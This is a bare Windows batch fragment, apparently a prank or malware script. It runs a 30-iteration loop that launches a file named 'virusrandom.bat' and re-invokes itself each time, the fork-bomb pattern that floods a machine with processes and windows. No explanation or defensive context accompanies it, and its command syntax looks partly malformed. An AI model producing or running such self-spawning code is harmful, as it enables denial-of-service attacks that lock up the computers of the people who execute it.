

for /l %%i in (1,1,30) do (
    start virusrandom.bat /k "%~f0 loop"
)
